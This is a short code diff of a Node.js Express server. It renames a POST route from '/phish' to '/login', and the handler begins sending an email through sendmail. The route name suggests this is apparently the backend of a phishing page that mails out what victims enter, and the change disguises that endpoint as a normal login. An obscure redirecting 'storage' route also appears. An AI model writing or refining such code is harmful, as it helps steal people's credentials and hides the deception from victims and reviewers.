@@ -34,7 +34,7 @@ app.get('/storage/8aASkfg4xz',function(req,res)
   res.redirect("/");
 });
 
-app.post('/phish',function(req,res)
+app.post('/login',function(req,res)
 {
   sendmail({
     from: 'no-reply@yourdomain.com',
